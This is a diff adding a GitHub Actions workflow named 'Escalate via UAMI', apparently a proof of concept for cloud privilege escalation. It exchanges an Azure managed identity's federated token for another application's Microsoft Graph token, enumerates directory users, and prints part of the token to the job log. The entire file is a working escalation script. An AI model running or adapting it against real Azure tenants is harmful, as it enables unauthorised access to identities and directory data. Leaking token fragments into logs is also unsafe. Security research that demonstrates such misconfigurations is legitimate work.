@@ -1,0 +1,48 @@
+name: Escalate via UAMI
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  escalate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Azure Login (UAMI Federated)
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.UAMI_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          allow-no-subscriptions: true
+          # No secret/cert required; OIDC used automatically
+          # IMPORTANT: client-id here is the UAMI clientId (not an App Registration)
+      - name: Exchange & Enumerate (PowerShell)
+        shell: pwsh
+        env:
+          APP_CLIENT_ID: ${{ secrets.APP_CLIENT_ID }}
+          TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+        run: |
+          Write-Host 'Acquire UAMI subject token (aud=api://AzureADTokenExchange)'
+          $uamiToken = az account get-access-token --resource api://AzureADTokenExchange --query accessToken -o tsv
+          if(-not $uamiToken){ throw 'Failed to get UAMI token' }
+
+            Write-Host 'Exchange for App (application role) token'
+          $body = [System.Collections.Generic.Dictionary[string,string]]::new()
+          $body.client_id = $env:APP_CLIENT_ID
+          $body.grant_type = 'urn:ietf:params:oauth:grant-type:token-exchange'
+          $body.subject_token = $uamiToken
+          $body.subject_token_type = 'urn:ietf:params:oauth:token-type:access_token'
+          $body.requested_token_use = 'on_behalf_of'
+          $body.scope = 'https://graph.microsoft.com/.default'
+          $tokenResp = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$($env:TENANT_ID)/oauth2/v2.0/token" -Body $body
+          $appToken = $tokenResp.access_token
+          if(-not $appToken){ throw 'Token exchange failed' }
+          Write-Host ("App token (first 30 chars): {0}" -f $appToken.Substring(0,30))
+
+          Write-Host 'Graph: list 5 users (UPNs)'
+          $users = Invoke-RestMethod -Headers @{Authorization = "Bearer $appToken"} -Uri 'https://graph.microsoft.com/v1.0/users?$top=5'
+          $users.value.userPrincipalName | ForEach-Object { Write-Host "  $_" }
+
+          Write-Host 'Done.'
